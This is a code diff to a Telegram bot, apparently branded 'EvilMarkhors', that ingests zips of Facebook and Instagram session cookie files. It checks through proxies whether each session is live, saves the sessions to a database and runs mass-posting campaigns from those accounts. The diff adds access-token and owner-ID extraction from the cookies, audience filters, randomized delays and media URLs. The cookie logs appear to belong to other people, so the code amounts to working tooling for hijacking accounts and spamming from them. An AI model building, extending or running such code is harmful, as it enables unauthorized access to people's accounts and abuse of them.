@@ -54,6 +54,7 @@ from src.utils.proxy import (
     get_active_proxies,
     load_proxies,
     mask_proxy,
+    mask_sensitive,
     norm_proxy,
     proxy_status_text,
     set_proxy_enabled,
@@ -142,6 +143,16 @@ def post_signature(tag: str = "") -> str:
     lines.append(f"Twitter: {TWITTER_URL}")
     lines.append(f"Facebook: {FACEBOOK_URL}")
     return "\n".join(lines)
+
+
+def compose_post_text(variant: str, tag: str = "", branding: bool = True) -> str:
+    """Variant + branding footer. Footer kabhi truncate nahi hota."""
+    body = variant or ""
+    if not branding:
+        return safe_text(body, 4096)
+    footer = post_signature(tag or DEFAULT_TAG)
+    body_max = max(1, 4096 - len(footer) - 2)
+    return safe_text(body, body_max).rstrip() + "\n\n" + footer
 
 
 def build_cookie_file(data: Dict[str, Any], cookies: List[str]) -> str:
@@ -271,10 +282,11 @@ def cleanup_user_state():
     for uid in expired:
         user_state.pop(uid, None)
 
-    # Also clean up old campaign configs (not running campaigns)
+    # Also clean up old campaign configs (not running campaigns). stage_at=0
+    # wale naye campaign ko turant expire nahi karna.
     expired_camps = [
         uid for uid, cfg in CAMPS.items()
-        if now - cfg.get("stage_at", now) > ttl and uid not in CAMPRUN
+        if now - (cfg.get("stage_at") or now) > ttl and uid not in CAMPRUN
     ]
     for uid in expired_camps:
         CAMPS.pop(uid, None)
@@ -332,8 +344,9 @@ def new_camp() -> dict:
         "branding": True,
         "source": "zip",
         "stage": "idle",
-        "stage_at": 0.0,
+        "stage_at": time.time(),
         "media": [],
+        "media_url": "",
         "texts": [],
     }
 
@@ -484,12 +497,36 @@ def resolve_platform(
 
 
 def _to_int(value: Any, default: int = 0) -> int:
-    """'1,234 followers' -> 1234; invalid -> default."""
+    """'1,234' / '1.2K' / '3M' -> int; invalid -> default."""
+    if isinstance(value, bool):
+        return int(value)
+    s = str(value or "").strip().lower().replace(",", "").replace(" ", "")
+    if not s:
+        return default
+    m = re.match(r"^(-?\d+(?:\.\d+)?)\s*([kmb])?$", s)
+    if m:
+        mult = {"k": 1_000, "m": 1_000_000, "b": 1_000_000_000}.get(
+            m.group(2) or "", 1
+        )
+        try:
+            return int(float(m.group(1)) * mult)
+        except (TypeError, ValueError):
+            return default
+    # Fallback: "12abc" -> 12, "+5" -> 5
+    cleaned = re.sub(r"[^0-9\-]", "", s)
     try:
-        cleaned = re.sub(r"[^0-9\-]", "", str(value or ""))
         return int(cleaned) if cleaned not in ("", "-") else default
     except (TypeError, ValueError):
         return default
+
+
+def _split_csv(values: List[str]) -> List[str]:
+    """['PK,', 'US'] -> ['PK', 'US'] (spaces/empties strip)."""
+    return [
+        part.strip()
+        for part in ",".join(values).split(",")
+        if part.strip()
+    ]
 
 
 def _status_folder(status: str) -> str:
@@ -576,9 +613,12 @@ def safe_text(text: str, max_len: int = 4096) -> str:
         return ""
     # Remove control characters except newline/tab
     text = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "", text)
-    # Limit length
+    # Limit length (ellipsis bhi limit ke andar rahe)
     if len(text) > max_len:
-        text = text[:max_len] + "..."
+        if max_len <= 3:
+            text = text[:max_len]
+        else:
+            text = text[: max_len - 3] + "..."
     return text
 
 
@@ -590,6 +630,27 @@ def check_user_rate_limit(uid: int) -> bool:
         return False
     user_state[uid] = user_state.get(uid, {})
     user_state[uid]["last_cmd"] = now
+    return True
+
+
+# Commands ke baad turant text/zip bhejna normal flow hai; command cooldown
+# (default 2s) content ko block nahi karna chahiye.
+CONTENT_COOLDOWN = float(os.getenv("CONTENT_COOLDOWN", "0.5"))
+
+# Ek cookie file ka max processing time (verify ke retries + slow retry cover
+# karne ke liye). Isse zyada hone par us file ko errors/ me daal kar aage barh
+# jate hain, warna ek hang poora zip stall kar deta hai.
+FILE_TIMEOUT = float(os.getenv("FILE_TIMEOUT", str(max(ACC_TIMEOUT, 180))))
+
+
+def check_content_rate_limit(uid: int) -> bool:
+    """Flood protection for text/media/zip ingestion (commands se alag)."""
+    now = time.time()
+    last = user_state.get(uid, {}).get("last_content", 0)
+    if now - last < CONTENT_COOLDOWN:
+        return False
+    user_state[uid] = user_state.get(uid, {})
+    user_state[uid]["last_content"] = now
     return True
 
 
@@ -633,6 +694,8 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "  /camp filter country PK,US | /camp filter followers 500\n"
         "  /camp delay 45-110 | /camp limit 50 | /camp dry (test mode)\n"
         "  /camp tag #EvilMarkhors | /camp branding on|off\n"
+        "  /camp mediaurl https://... (IG public image) | /camp mediaclear\n"
+        "  /camp filter year 2015,2016\n"
         "  /camp source zip|db | /camp preview | /camp start | /camp reset\n"
         "  /stopcamp\n\n"
         "DB: /db stats | /db export fb|ig | /db reverify fb|ig [limit]\n"
@@ -648,19 +711,22 @@ async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_user_rate_limit(uid):
         await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
         return
-    fb = "ON" if _fb_platform else "OFF"
-    ig = "ON" if _ig_platform else "OFF"
-    await update.message.reply_text(
-        f"{BRAND} Bot v{BOT_VERSION}\n"
-        f"Credit: {CREDIT}\n"
-        f"Web: {WEBSITE}\n"
-        f"Admin: {uid in ADMIN_IDS}\n"
-        f"Facebook: {fb}\n"
-        f"Instagram: {ig}\n"
-        f"DB: {'ON' if _db else 'OFF'}\n"
-        f"Proxies: {len(get_active_proxies())} active / {len(load_proxies())} configured\n"
-        f"Campaigns: {len(CAMPS)} saved | {len(CAMPRUN)} running"
-    )
+    lines = [
+        f"{BRAND} Bot v{BOT_VERSION}",
+        f"Credit: {CREDIT}",
+        f"Web: {WEBSITE}",
+        f"Admin: {uid in ADMIN_IDS}",
+    ]
+    if uid in ADMIN_IDS:
+        lines += [
+            f"Facebook: {'ON' if _fb_platform else 'OFF'}",
+            f"Instagram: {'ON' if _ig_platform else 'OFF'}",
+            f"DB: {'ON' if _db else 'OFF'}",
+            f"Proxies: {len(get_active_proxies())} active / "
+            f"{len(load_proxies())} configured",
+            f"Campaigns: {len(CAMPS)} saved | {len(CAMPRUN)} running",
+        ]
+    await update.message.reply_text("\n".join(lines))
 
 
 async def diag_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1068,11 +1134,17 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Delay: {cfg['delay'][0]}-{cfg['delay'][1]}s\n"
             f"Dry run: {cfg['dry_run']}\n"
             f"Texts: {len(cfg['texts'])}\n"
-            f"Media: {len(cfg['media'])}"
+            f"Media: {len(cfg.get('media', []))}\n"
+            f"Media URL: {cfg.get('media_url') or '-'}"
         )
         return
 
     if sub == "new":
+        if uid in CAMPRUN:
+            await update.message.reply_text(
+                "Campaign chal raha hai. Pehle /stopcamp ya /cancel karo."
+            )
+            return
         cfg = new_camp()
         cfg["name"] = safe_text((" ".join(args[1:]) or "camp"), 40)
         CAMPS[uid] = cfg
@@ -1088,6 +1160,9 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not cfg:
         await update.message.reply_text("Pehle /camp new <name>.")
         return
+
+    # Koi bhi activity campaign ko TTL cleanup se bachaye.
+    cfg["stage_at"] = time.time()
 
     if sub == "platform":
         p = (args[1] if len(args) > 1 else "").lower()
@@ -1136,8 +1211,24 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
         await update.message.reply_text(
             "Photo/video bhejo.\n"
-            "Note: IG Graph API ko public image URL chahiye; file_id se direct post nahi hota."
+            "Note: Graph API ko public image URL chahiye; file_id se direct post "
+            "nahi hota. URL ke liye /camp mediaurl <https://...> use karo."
         )
+        return
+
+    if sub in ("mediaurl", "mediaclear"):
+        if sub == "mediaclear" or (args[1].lower() if len(args) > 1 else "") == "clear":
+            cfg["media_url"] = ""
+            save_camp(uid)
+            await update.message.reply_text("Media URL clear.")
+            return
+        url = args[1] if len(args) > 1 else ""
+        if not url.lower().startswith(("http://", "https://")):
+            await update.message.reply_text("Usage: /camp mediaurl https://public/image.jpg")
+            return
+        cfg["media_url"] = url
+        save_camp(uid)
+        await update.message.reply_text("Media URL set. IG post isi image se hoga.")
         return
 
     if sub == "source":
@@ -1162,9 +1253,10 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("country | year | followers | clear")
             return
         if k == "country":
-            f["countries"] = [x.upper() for x in " ".join(args[2:]).split(",") if x.strip()]
+            # "PK, US" -> ["PK", "US"] (leading space strip warna US match nahi hota)
+            f["countries"] = [x.upper() for x in _split_csv(args[2:])]
         elif k == "year":
-            f["years"] = [x.strip() for x in " ".join(args[2:]).split(",") if x.strip()]
+            f["years"] = _split_csv(args[2:])
         elif k == "followers":
             try:
                 f["min_followers"] = max(int(args[2]), 0)
@@ -1233,7 +1325,12 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("Pehle text variants bhejo.")
             return
         for i, t in enumerate(cfg["texts"][:5]):
-            await update.message.reply_text(f"Variant {i+1}: {safe_text(t, 4096)}")
+            preview = compose_post_text(
+                t,
+                cfg.get("tag") or DEFAULT_TAG,
+                bool(cfg.get("branding", POST_BRANDING)),
+            )
+            await update.message.reply_text(f"Variant {i+1}:\n{safe_text(preview, 4096)}")
         return
 
     if sub == "start":
@@ -1246,6 +1343,12 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if cfg["platform"] not in ("facebook", "instagram"):
             await update.message.reply_text("Pehle /camp platform facebook|instagram set karo.")
             return
+        if cfg["platform"] == "instagram" and not cfg.get("media_url"):
+            await update.message.reply_text(
+                "Note: Instagram text-only post nahi hota. Public image URL ke "
+                "bina sab posts UNSUPPORTED aayenge. /camp mediaurl https://... "
+                "set karo (ya /camp dry se test karo)."
+            )
 
         if cfg.get("source") == "db":
             if not _db:
@@ -1382,6 +1485,9 @@ async def _campaign_loop(
         )
 
     sem = asyncio.Semaphore(max(CONCURRENCY, 1))
+    # Ek hi DB client poore campaign ke liye (per-account client slow tha).
+    db_client = httpx.AsyncClient(timeout=httpx.Timeout(10.0)) if _db else None
+    media_url = str(cfg.get("media_url") or "")
 
     async def _do_account(acc):
         nonlocal posted_count, failed_count, skipped_count, dry_count, unsupported_count, last_note
@@ -1406,16 +1512,15 @@ async def _campaign_loop(
         if status != "LIVE":
             failed_count += 1
             last_note = f"{status} ({check.get('via', '-')}) {check.get('Reason', '')[:40]} | {uname}"
-            if _db and uname:
+            if _db and uname and db_client is not None:
                 try:
-                    async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as db_cl:
-                        await _db.patch_status(
-                            db_cl,
-                            "fb_accounts" if platform == "facebook" else "ig_accounts",
-                            uname,
-                            status.lower(),
-                            ok=False,
-                        )
+                    await _db.patch_status(
+                        db_client,
+                        "fb_accounts" if platform == "facebook" else "ig_accounts",
+                        uname,
+                        status.lower(),
+                        ok=False,
+                    )
                 except Exception:  # noqa: BLE001
                     logger.debug("status patch failed", exc_info=True)
             return
@@ -1426,11 +1531,18 @@ async def _campaign_loop(
         followers = _to_int(acc.get("followers")) or _to_int(
             check.get("followers") or check.get("Followers")
         )
+        year = str(acc.get("year") or "")
         if filt.get("countries") and country and country.upper() not in [
             c.upper() for c in filt["countries"]
         ]:
             skipped_count += 1
             last_note = f"FILTER country={country} | {uname}"
+            return
+        if filt.get("years") and year and year not in [
+            str(y) for y in filt["years"]
+        ]:
+            skipped_count += 1
+            last_note = f"FILTER year={year} | {uname}"
             return
         if filt.get("min_followers", 0) > followers:
             skipped_count += 1
@@ -1442,9 +1554,13 @@ async def _campaign_loop(
             last_note = f"DRY RUN (no post) | {uname}"
             return
 
-        text = random.choice(texts)
-        if cfg.get("branding", POST_BRANDING):
-            text = text.rstrip() + "\n\n" + post_signature(cfg.get("tag") or DEFAULT_TAG)
+        text = compose_post_text(
+            random.choice(texts),
+            cfg.get("tag") or DEFAULT_TAG,
+            bool(cfg.get("branding", POST_BRANDING)),
+        )
+        # Per-account media URL optional; campaign-level fallback.
+        media = str(acc.get("media_url") or media_url or "")
         post_proxy = proxy if check.get("via") == "proxy" else None
         access_token = str(acc.get("access_token") or "")
         target_id = str(acc.get("target_id") or "")
@@ -1453,7 +1569,8 @@ async def _campaign_loop(
             ok, post_id, err = await platform_obj.post(
                 cl,
                 ck,
-                safe_text(text),
+                text,
+                media=media or None,
                 access_token=access_token or None,
                 target_id=target_id or None,
             )
@@ -1480,14 +1597,16 @@ async def _campaign_loop(
                     "last_post": now,
                 }
                 try:
-                    async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as db_cl:
+                    if db_client is not None:
                         saved, db_err = await _db.upsert(
-                            db_cl,
+                            db_client,
                             "fb_accounts" if platform == "facebook" else "ig_accounts",
                             [row],
                         )
-                    if not saved:
-                        logger.warning("campaign DB save failed for %s: %s", uname, db_err)
+                        if not saved:
+                            logger.warning(
+                                "campaign DB save failed for %s: %s", uname, db_err
+                            )
                 except Exception:  # noqa: BLE001
                     logger.exception("campaign DB save failed for %s", uname)
         elif err and str(err).startswith("UNSUPPORTED"):
@@ -1523,7 +1642,7 @@ async def _campaign_loop(
                     {
                         "working": posted_count,
                         "dead": failed_count,
-                        "unknown": skipped_count + dry_count,
+                        "unknown": skipped_count + dry_count + unsupported_count,
                         "errors": 0,
                     },
                     last=last_note,
@@ -1542,7 +1661,13 @@ async def _campaign_loop(
         async with sem:
             await process_account(acc)
 
-    await asyncio.gather(*(run_account(acc) for acc in accounts), return_exceptions=True)
+    try:
+        await asyncio.gather(
+            *(run_account(acc) for acc in accounts), return_exceptions=True
+        )
+    finally:
+        if db_client is not None:
+            await db_client.aclose()
 
     summary = (
         f"Campaign complete! ({prog_total} accounts)\n"
@@ -1560,8 +1685,13 @@ async def _campaign_loop(
             await progress_msg.edit_text(summary)
         except Exception:  # noqa: BLE001
             pass
-    # Clear campaign mode
-    user_state.pop(uid, None)
+    # Clear campaign mode only if the user has not switched to another mode
+    # while this campaign was running.
+    if user_state.get(uid, {}).get("mode") == "campaign":
+        user_state.pop(uid, None)
+    cfg["stage"] = "idle"
+    cfg["stage_at"] = time.time()
+    save_camp(uid)
 
 
 # ============================ FILE HANDLING ============================
@@ -1571,8 +1701,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await _require_admin(update):
         return
-    if not check_user_rate_limit(uid):
-        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
+    if not check_content_rate_limit(uid):
+        await update.message.reply_text("Thoda ruk kar dobara file bhejo (flood protection).")
         return
 
     doc = update.message.document
@@ -1606,6 +1736,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     no_proxy_note = "" if has_proxy else " | ⚠️ proxy OFF (direct traffic)"
 
     tmp = tempfile.mkdtemp(prefix="sm_")
+    # Poore upload ke liye ek DB client (per-file client 15k files par slow).
+    db_client = httpx.AsyncClient(timeout=httpx.Timeout(10.0)) if _db else None
     try:
         file = await context.bot.get_file(doc.file_id)
         path = os.path.join(tmp, os.path.basename(doc.file_name))
@@ -1639,7 +1771,14 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         async def process_entry(name: str, raw: str):
             try:
-                return await _process_one(name, raw, state)
+                return await asyncio.wait_for(
+                    _process_one(name, raw, state, db_client=db_client),
+                    timeout=FILE_TIMEOUT,
+                )
+            except asyncio.TimeoutError:
+                return error_result(
+                    name, raw, TimeoutError(f"processing timeout ({FILE_TIMEOUT:.0f}s)")
+                )
             except Exception as e:  # noqa: BLE001
                 logger.exception("process failed: %s", name)
                 return error_result(name, raw, e)
@@ -1660,6 +1799,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     i for i in z.infolist()
                     if not i.is_dir() and i.filename.lower().endswith(".txt")
                 ]
+                if not infos:
+                    await msg.edit_text(
+                        "Zip me koi .txt file nahi mili. Sirf .txt entries bhejo."
+                    )
+                    return
                 total_uncompressed = sum(i.file_size for i in infos)
                 if total_uncompressed > ZIP_MAX_TOTAL:
                     await msg.edit_text(
@@ -1689,6 +1833,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
 
                 processed = 0
+                actual_total = 0
                 batch_size = max(CONCURRENCY * 4, 32) if live_on else 1
                 for start in range(0, len(infos), batch_size):
                     batch = infos[start:start + batch_size]
@@ -1713,7 +1858,23 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             await reporter.update(processed, progress_counts, current=who, last=note)
                             continue
                         try:
-                            raw = z.read(info).decode("utf-8", "ignore")
+                            # Declared size spoof ho sakta hai (zip bomb), is liye
+                            # actual bytes ko cap ke saath padho.
+                            with z.open(info) as fh:
+                                blob = fh.read(ZIP_MAX_FILE + 1)
+                            if len(blob) > ZIP_MAX_FILE:
+                                raise ValueError(
+                                    f"entry actual size > {ZIP_MAX_FILE} bytes"
+                                )
+                            actual_total += len(blob)
+                            if actual_total > ZIP_MAX_TOTAL:
+                                await msg.edit_text(
+                                    f"Zip bomb detected: actual uncompressed data "
+                                    f"exceeds {ZIP_MAX_TOTAL // (1024 * 1024)}MB. "
+                                    "Upload chhota karo."
+                                )
+                                return
+                            raw = blob.decode("utf-8", "ignore")
                         except Exception as e:  # noqa: BLE001
                             processed += 1
                             who, note = record(error_result(name, "", e), processed)
@@ -1784,9 +1945,12 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     "username": uname,
                     "cookies": cookies,
                     "country": meta.get("Country", ""),
+                    "year": meta.get("Year", ""),
                     "followers": _to_int(meta.get("Followers")),
                     "verified": str(meta.get("Verified", "")).lower() == "true",
-                    "access_token": "",
+                    "access_token": str(
+                        meta.get("Access token") or meta.get("Token") or ""
+                    ),
                     "target_id": str(meta.get("ID", "")),
                 })
             if cfg and cfg.get("limit"):
@@ -1852,6 +2016,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.exception("handle_file")
         await msg.edit_text(f"File process karne mein error aaya: {type(e).__name__}: {e}")
     finally:
+        if db_client is not None:
+            await db_client.aclose()
         shutil.rmtree(tmp, ignore_errors=True)
 
 
@@ -1882,7 +2048,11 @@ async def _verify_cookie(platform_obj: BasePlatform, cookies: Dict[str, str], pr
         try:
             routes.append(("proxy", platform_obj.http_client(proxy=proxy)))
         except Exception as e:  # noqa: BLE001
-            logger.warning("proxy client create failed (%s): %s", proxy, e)
+            logger.warning(
+                "proxy client create failed (%s): %s",
+                mask_proxy(proxy),
+                mask_sensitive(str(e)),
+            )
     try:
         routes.append(("direct", platform_obj.http_client()))
     except Exception as e:  # noqa: BLE001
@@ -1904,9 +2074,14 @@ async def _verify_cookie(platform_obj: BasePlatform, cookies: Dict[str, str], pr
         try:
             check = await platform_obj.live_check(cl, cookies)
         except Exception as e:
-            logger.warning("verify %s route error: %s", label, e)
+            logger.warning(
+                "verify %s route error: %s", label, mask_sensitive(str(e))
+            )
             last_error = e
-            check = {"Status": "UNKNOWN", "Reason": f"{type(e).__name__}: {str(e)[:60]}"}
+            check = {
+                "Status": "UNKNOWN",
+                "Reason": f"{type(e).__name__}: {mask_sensitive(str(e))[:60]}",
+            }
         finally:
             await cl.aclose()
 
@@ -1927,10 +2102,19 @@ async def _verify_cookie(platform_obj: BasePlatform, cookies: Dict[str, str], pr
         final = check
 
     if dead_result is not None:
-        if len(results) > 1:
-            dead_result["Reason"] = " | ".join(
-                f"{r.get('via')}: {r.get('Status')}/{r.get('Reason', '')}" for r in results
-            )
+        combined = " | ".join(
+            f"{r.get('via')}: {r.get('Status')}/{r.get('Reason', '')}"
+            for r in results
+        )
+        # Proxy ne DEAD kaha lekin direct route confirm nahi kar saka (UNKNOWN)
+        # to DEAD claim nahi karte — proxy ka block page false DEAD deta hai.
+        if any(r.get("Status") == "UNKNOWN" for r in results):
+            return {
+                "Status": "UNKNOWN",
+                "Platform": platform_obj.NAME,
+                "Reason": f"DEAD unconfirmed (proxy only): {combined}",
+            }
+        dead_result["Reason"] = combined
         return dead_result
 
     if final:
@@ -1940,14 +2124,18 @@ async def _verify_cookie(platform_obj: BasePlatform, cookies: Dict[str, str], pr
             if delay > 0:
                 logger.info("verify: all routes UNKNOWN, slow retry in %ss", delay)
                 await asyncio.sleep(delay)
-                cl = platform_obj.http_client()
+                cl = None
                 try:
+                    cl = platform_obj.http_client()
                     retry = await platform_obj.live_check(cl, cookies)
                 except Exception as e:  # noqa: BLE001
-                    logger.warning("verify slow retry error: %s", e)
+                    logger.warning(
+                        "verify slow retry error: %s", mask_sensitive(str(e))
+                    )
                     retry = None
                 finally:
-                    await cl.aclose()
+                    if cl is not None:
+                        await cl.aclose()
                 if retry:
                     retry["via"] = "direct-retry"
                     results.append(retry)
@@ -1968,7 +2156,12 @@ async def _verify_cookie(platform_obj: BasePlatform, cookies: Dict[str, str], pr
     }
 
 
-async def _process_one(name: str, raw: str, state: dict) -> tuple:
+async def _process_one(
+    name: str,
+    raw: str,
+    state: dict,
+    db_client: Optional[httpx.AsyncClient] = None,
+) -> tuple:
     """Process a single cookie file."""
     bp = BasePlatform()
     cookie_data, cookie_lines = bp.parse_cookie_file(raw)
@@ -2004,6 +2197,14 @@ async def _process_one(name: str, raw: str, state: dict) -> tuple:
 
     platform_obj = get_platform(platform)
 
+    # Session cookie me owner id hamesha hota hai (c_user / ds_user_id). HTML
+    # se id na mile to bhi output/DB me ID fill ho jati hai.
+    owner_id = str(
+        cookie_data.get("c_user") or cookie_data.get("ds_user_id") or ""
+    ).strip()
+    if owner_id and not meta.get("ID"):
+        meta["ID"] = owner_id
+
     # Live check if enabled — proxy + direct dono routes try hote hain
     want_live = bool(state.get("live")) or state.get("mode") == "verify"
     check: Dict[str, Any] = {}
@@ -2032,15 +2233,19 @@ async def _process_one(name: str, raw: str, state: dict) -> tuple:
     if want_live and _db:
         table = "fb_accounts" if platform == "facebook" else "ig_accounts"
         norm = _norm_meta(meta)
-        username = str(norm.get("Username", "") or norm.get("ID", "") or "").strip()
+        username = str(
+            norm.get("Username", "") or norm.get("ID", "") or owner_id or ""
+        ).strip()
         if not username:
             logger.warning("DB save skipped (no username/ID): %s", name)
         else:
             now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
             row = {
                 "username": username,
-                "fb_id": str(norm.get("ID", "")) if platform == "facebook" else "",
-                "ig_id": str(norm.get("ID", "")) if platform == "instagram" else "",
+                "fb_id": str(norm.get("ID", "") or owner_id)
+                if platform == "facebook" else "",
+                "ig_id": str(norm.get("ID", "") or owner_id)
+                if platform == "instagram" else "",
                 "cookies": encrypt_cookies(cookie_data),
                 "country": norm.get("Country", ""),
                 "followers": _to_int(norm.get("Followers")),
@@ -2052,8 +2257,13 @@ async def _process_one(name: str, raw: str, state: dict) -> tuple:
             if status == "LIVE":
                 row["last_ok"] = now
             try:
-                async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as cl:
-                    saved, db_err = await _db.upsert(cl, table, [row])
+                if db_client is not None:
+                    saved, db_err = await _db.upsert(db_client, table, [row])
+                else:
+                    async with httpx.AsyncClient(
+                        timeout=httpx.Timeout(10.0)
+                    ) as cl:
+                        saved, db_err = await _db.upsert(cl, table, [row])
                 if not saved:
                     logger.warning("DB save failed for %s (%s): %s", name, table, db_err)
             except Exception:  # noqa: BLE001
@@ -2089,8 +2299,8 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not _is_admin(uid):
         return
-    if not check_user_rate_limit(uid):
-        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
+    if not check_content_rate_limit(uid):
+        await update.message.reply_text("Thoda ruk kar dobara bhejo (flood protection).")
         return
 
     cfg = CAMPS.get(uid)
@@ -2140,9 +2350,15 @@ async def on_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         return
 
+    if len(cfg.get("media", [])) >= 50:
+        await msg.reply_text(
+            "Media limit 50 hai. /camp reset ya naya campaign use karo."
+        )
+        return
     cfg["media"].append(entry)
     save_camp(uid)
     await msg.reply_text(
         f"Media {len(cfg['media'])} added ({entry['type']}).\n"
-        "Note: Graph API ko public URL chahiye hota hai; file_id se direct post nahi hota."
+        "Note: Graph API ko public URL chahiye hota hai; file_id se direct post "
+        "nahi hota. URL ke liye /camp mediaurl https://... set karo."
     )
